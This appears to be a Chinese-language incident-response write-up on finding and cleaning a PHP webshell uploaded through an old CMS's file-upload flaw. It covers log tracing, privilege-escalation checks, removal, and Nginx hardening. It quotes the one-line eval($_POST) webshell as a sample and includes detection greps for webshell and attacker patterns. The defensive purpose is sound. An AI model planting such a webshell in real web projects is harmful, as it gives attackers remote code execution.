---
category: 安全
difficulty: 高级
date: 2024-07-22
---

# Web 站点发现 Webshell 的排查处置（2024-07-22）

## 现象

安全扫描/巡检发现 Web 目录下多了一个陌生脚本：

```bash
/var/www/html/uploads/xxx.php
```

文件内容是一句话木马：

```php
<?php @eval($_POST['cmd']); ?>
```

网站被人传了 Webshell。

## 环境

| 组件 | 版本 |
|---|---|
| 操作系统 | Ubuntu 22.04 |
| Web 服务 | Nginx 1.24 + PHP-FPM 8.2 |
| 站点 | 内容管理系统（CMS）旧版本，有已知文件上传漏洞 |
| 网站根目录 | /var/www/html |

## 定位过程

### 1. 先确认 Webshell 文件本身

```bash
# 找到所有可疑 php 文件（uploads 目录本不该有可执行 php）
find /var/www/html -name "*.php" -newer /var/www/html/index.php -mtime -30

# 看文件时间（创建/修改时间是入侵时间线索）
stat /var/www/html/uploads/xxx.php
# 输出：Modify: 2024-07-20 03:14:22
```

文件修改时间 `03:14` 就是攻击者大概写入 Webshell 的时间。

### 2. 查 Web 日志，定位上传入口

按文件时间倒推，在 Nginx access log 里找那段时间前后的可疑请求：

```bash
# 找 03:10~03:20 之间的 POST 请求（上传动作）
grep "20/Jul/2024:03:1" /var/log/nginx/access.log | grep "POST"

# 重点找 upload 接口、异常路径
grep -E "upload|\.php" /var/log/nginx/access.log | grep -v "200 \"-\"" | tail -30
```

发现一条：

```text
POST /index.php?c=upload&f=file  200  来自 185.xxx.xxx.xxx
```

攻击 IP 在 CMS 一个未授权上传漏洞接口上 POST 了 Webshell。

### 3. 看攻击者后续干了什么

```bash
# 找该 IP 的所有访问记录
grep "185.xxx.xxx.xxx" /var/log/nginx/access.log
# 看访问了哪些敏感路径（提权、横向移动）
grep "185.xxx.xxx.xxx" | grep -E "eval|whoami|/etc/passwd|bash"
```

### 4. 排查是否已提权

```bash
# 看系统日志该时间点有没有异常
last | head
grep "Accepted" /var/log/auth.log | grep "20/Jul/2024"

# 看有没有新用户
cat /etc/passwd | grep -v "/nologin\|/false"
```

## 根因

| 层级 | 说明 |
|---|---|
| 直接原因 | CMS 旧版本存在文件上传漏洞，攻击者上传 Webshell |
| 配置原因 | uploads 目录没禁 PHP 执行，Webshell 可被访问触发 |
| 流程原因 | CMS 长期没升级、没做 WAF |

## 解决步骤

### 止血

1. 立刻删除 Webshell 文件：

```bash
rm -f /var/www/html/uploads/xxx.php
# 全盘扫其他 Webshell（一句话特征）
grep -rl "eval(\$_(POST\|GET\|REQUEST)" /var/www/html/
```

2. 封禁攻击 IP：

```bash
iptables -A INPUT -s 185.xxx.xxx.xxx -j DROP
```

### 根治

1. uploads 目录禁掉 PHP 执行（最有效预防）：

```nginx
# Nginx 配置：upload 目录只允许静态文件，不解析 php
location /uploads/ {
    location ~ \.php$ { return 403; }
}
```

2. 升级 CMS 到最新版，修复上传漏洞；给后台加 WAF。

3. 排查是否已被提权：如果攻击者已经拿到系统权限（加了用户、SSH 后门），**必须重装系统**，单删 Webshell 不解决问题。

4. 改 CMS 后台密码、数据库密码，检查所有第三方组件版本。

## 验证与预防

```bash
# 再扫一次确认没有遗留 webshell
find /var/www/html -name "*.php" | xargs grep -l "eval\|\$_(POST\|assert"
# Web 日志里不再有该攻击 IP
tail -f /var/log/nginx/access.log
```

- 预防：uploads 目录禁脚本执行；CMS 及时升级；后台访问加白名单/VPN。
- 监控：WAF 告警；Web 目录文件变动监控（inotify 巡检新增 php）。
- 取证：发现入侵先保留日志和样本，再清理，必要时上报/留存证据。

## 相关

- 命令速查：[Linux 命令速查](/reference/linux-commands) ｜ [网络命令速查](/reference/network-commands)
- 同组短文：[挖矿木马清理](/cases/t-mining-trojan) ｜ [异常外联/C2 回连](/cases/t-malicious-c2-traffic)
